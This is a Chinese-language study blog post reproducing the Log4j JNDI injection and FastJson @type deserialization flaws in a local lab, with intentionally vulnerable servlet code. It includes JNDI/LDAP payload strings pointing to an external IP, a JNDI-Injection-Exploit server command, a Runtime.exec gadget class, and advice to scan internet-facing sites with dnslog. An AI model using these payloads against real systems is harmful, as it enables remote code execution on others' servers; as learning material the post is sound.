---
title: JavaEE应用&Log4j日志&FastJson序列化&JNDI注入
published: 2025-10-23
description: JavaEE第三方组件的调用以及对JNDI的认识。
tags: [JavaEE,安全开发]
category: 网络安全
draft: false
---

# JavaEE应用&第三方组件&Log4j日志&FastJson序列化&JNDI注入

## Java—三方组件—Log4J&JNDI

### Log4j

**可以利用网络空间查询哪些站用了log4j，把利用代码的IP地址改为dnslog地址，如果有回显就说明漏洞存在。**

Apache 的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、 GUI 组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。

#### Log4j组件安全复现

1. Maven引用Log4j
2. 接受用户输入值
3. Log4j处理错误输入

4. 利用jndi-ldap执行

Test:

String code="test";

String code="${java:os}";

logger.error("{}",code);

String exp="${jndi:ldap://xx.xx.xx.xx:xx/xxx}";

在idea中直接在xml文件写入log4j依赖，更新maven就会在外部库中看到，这样就是引入成功了。

之后可以创建Log4jTest.java，log4j是开源的日志记录框架，用于记录程序输入输出日志信息，log4j2 中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞，成功利用该漏洞可在目标服务器上执行任意代码。

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {

    private static  final Logger logger= LogManager.getLogger(Log4jTest.class);

    public static void main(String[] args) {

        // 如果这个code变量是可控的，
        String code =  "${java:os}";
        logger.error("{}",code);
    }
}
```

#### 测试漏洞

创建新项目Log4jWeb，将Log4j依赖导入，并创建Log4jServlet.java代码如下：

```java
package org.example.log4jwebdemo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/log4j")
public class Log4jServlet extends HttpServlet {
    // 构造HTTP WEB服务  使用带漏洞Log4j版本 实现功能
    private static final Logger logger = LogManager.getLogger(Log4jServlet.class);

    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse res) {
        // 接收
        String code = req.getParameter("code");
        //code=$(java:os) 输出执行结果
        //code=(java:os) 正常输入
        //${jndi:ldap://47.94.236.117:1389/uyhyw6}
        //${jndi:ldap://xxxx.dns.log}
        //ldap://47.94.236.117:1389/uyhyw6 生成的远程可访问的调用方法
        //什么方法？ -C "calc" 执行计算机的功能方法（JNDI注入工具生成的）
        
        
        
        // 调用日志输出
        logger.error("{}",code);
        
        //1、开发源码中引用漏洞组件如log4j
        //2、开发中使用组件的代码（触发漏洞代码）
        //3、可控变量去传递Payload来实现攻击
    }
}
```

启动tomcat，在url输入：http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=$%7bjava:os%7d，一开始是使用的`%{java:os}`提示是非法的字符，之后就使用ASCII编码中对应的进行转义就可以正常访问了。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3601.png)

#### 网上漏洞注入

https://blog.csdn.net/qq_51302564/article/details/121963049

### JNDI

RMI（Remote Method Invocation，远程方法调用）是一种用于在分布式系统中实现对象之间通信的协议。它允许一个Java对象（客户端）调用另一个Java对象（服务器端）的方法，即使这两个对象运行在不同的虚拟机（JVM）中，甚至不同的物理机器上。RMI是Java语言中内置的分布式计算技术，主要用于构建分布式应用程序。

注入原理：利用自带的LDAP、RMI协议完成调用class文件实现。

**RMI协议&RPC**

![image-20251023160653921](C:\Users\pwn\AppData\Roaming\Typora\typora-user-images\image-20251023160653921.png)

**LDAP协议**

LDAP Light Directory Access Portocol

LDAP协议主要用于单点登录SSO(SingleSignon)，典型的案例：

学校的单点登录系统，登录后教务系统、选课系统等都可以直接访问

LDAP可以用于SSO，但不等与SSO，这种协议还可以用于统一各种系统的认证方式、储存企业组织架构，员工信息（由于它使用树形结构，查询效率高）等等

LDAP的服务处理工厂类是：com.sun.jndi.ldap.LdapCtxFactory，连接LDAP之前需要配置好远程的LDAP服务。

![image-20251023161019455](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251023161019455.png)

#### 使用FinalShell生成JNDI进行漏洞注入

```shell
// 如果没安装Java的话
sudo apt install default-jre

// 之后切换到jar包所在的目录
//  使用命令
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "IP地址"
```

可参考：https://blog.csdn.net/weixin_43895765/article/details/121943404

但是我这里不知道是什么问题执行没成功，估计是JDK版本问题，我电脑本身的JDK8不知道为什么问题很多，后续会换，目前还是看文章内的吧。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3603.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3602.png)

## Java-三方组件-FastJson&反射

### FastJson

在前后端数据传输交互中 , 经常会遇到字符串 (String) 与 json,XML 等格式相互转换与解析，其中 json 以跨语言，跨前后端的优点在开发中被频繁使用，基本上是标准的数据
交换格式。它的接口简单易用，已经被广泛使用在缓存序列化，协议交互， Web 输出等各种应用场景中。 FastJson 是阿里巴巴的的开源库，用于对 JSON 格式的数据进行解析和打包。

先创建软件包，名字任意，之后再创建两个类，一个是User，另外一个FastJson。

代码如下：

User类：

```java
package com.test;

public class User {
    private String name;
    private int age;

    public String getName(){
        return name;
    }
    public Integer getAge(){
        return age;
    }

    public void setName(String name){
        this.name = name;
        System.out.println(name);
    }
    public void setAge(int age){
        this.age = age;
        System.out.println(age);
    }
}
```

FastJson类：

```java
package com.test;

public class FastJson {
    public static void main(String[] args) {
        // userinfo Object对象
        // Integer age String name 字符串数据
        User userinfo = new User();
        userinfo.setName("attackor7");
        userinfo.setAge(24);

        // 我们想把数据转换成Json格式数据，我不想用自带的API（太麻烦）
        // 我就选择第三方组件fastjson来去做这个功能
        // 将json对象转换json数据
//        String json = JSONObject.toJSONString(userinfo);
//        System.out.println("Json格式："+json);

        // 分析漏洞利用 输出 转换数据的类型（类） 告诉大家其实前面有一个@type 转换对象类包
//        String json1 = JSONObject.toJSONString(userinfo, SerializerFeature.WriteClassName);
//        System.out.println(json1);
    }
}
```

在FastJson中把传入的参数值，打印为Json格式。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3604.png)

#### Fastjson漏洞造成

当json转换为对象的时候，翻译从User改为Run从而调用错误。

创建一个类名为Run，代码如下：

```java
package com.test;

import java.io.IOException;

public class Run {
    public Run() throws IOException {
        Runtime.getRuntime().exec("notepad");
    }
}
```

之后在FastJson中把代码改为以下，就可实现远程命令执行。

```java
String un = "{\"@type\":\"com.test.Run\",\"age\":24,\"name\":\"attackor7\"}";
JSONObject jsonObject = JSON.parseObject(un);
System.out.println(jsonObject);
```

FastJson完整代码：

```java
package com.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FastJson {
    public static void main(String[] args) {
        // userinfo Object对象
        // Integer age String name 字符串数据
        User userinfo = new User();
        userinfo.setName("attackor7");
        userinfo.setAge(24);

        // 我们想把数据转换成Json格式数据，我不想用自带的API（太麻烦）
        // 我就选择第三方组件fastjson来去做这个功能
        // 将json对象转换json数据
//        String json = JSONObject.toJSONString(userinfo);
//        System.out.println("Json格式："+json);

        // 分析漏洞利用 输出 转换数据的类型（类） 告诉大家其实前面有一个@type 转换对象类包
//        String json1 = JSONObject.toJSONString(userinfo, SerializerFeature.WriteClassName);
//        System.out.println(json1);

        // 以上代码为 对象转为Json格式
        // 下方代码为 Json转为对象
//        String un = "{\"@type\":\"com.test.User\",\"age\":24,\"name\":\"attackor7\"}";
        String un = "{\"@type\":\"com.test.Run\",\"age\":24,\"name\":\"attackor7\"}";


        // 实战中com.xiaodi.Run，也就是这个对象类包和类，我们是不知道的，所以一般是固定调用
        // 比如java.net.Inet4Address java自带的类包，详细可参考文章末链接的文章
        // rmi ldap注入去触发远程的class 执行代码（RCE）

        JSONObject jsonObject = JSON.parseObject(un);
        System.out.println(jsonObject);

    }
}
```

#### exp(漏洞利用)文章

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3605.png)

使用dnslog.cn来判断漏洞;

https://blog.csdn.net/HEAVEN569/article/details/125390631